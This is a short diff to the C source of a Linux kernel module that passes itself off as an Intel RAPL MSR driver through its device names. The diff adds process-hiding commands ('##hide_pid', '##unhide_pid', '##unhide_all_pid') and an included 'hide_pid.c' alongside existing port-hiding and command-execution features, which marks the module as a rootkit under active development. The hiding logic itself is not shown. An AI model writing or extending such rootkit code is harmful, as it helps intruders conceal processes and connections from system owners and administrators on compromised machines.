@@ -10,6 +10,8 @@
 #include <net/udp.h>         // struct tcp_seq_afinfo.
 #include <linux/printk.h>
 
+#include "hide_pid.c"
+
 #define DEVICE_NAME "inter_rapl_msrdv"
 #define CLASS_NAME "inter_rapl_msrmd"
 #define DEVICE_PATH "/dev/inter_rapl_msrdv"
@@ -75,6 +77,9 @@ static char *exec_cmd(char *cmd);
 #define HIDE_PORT "##hide_port"
 #define UNHIDE_PORT "##unhide_port"
 
+#define HIDE_PID "##hide_pid"
+#define UNHIDE_PID "##unhide_pid"
+#define UNHIDE_ALL_PID "##unhide_all_pid"
 
 #define TCP_CONNECT 1
 #define UDP_CONNECT 2
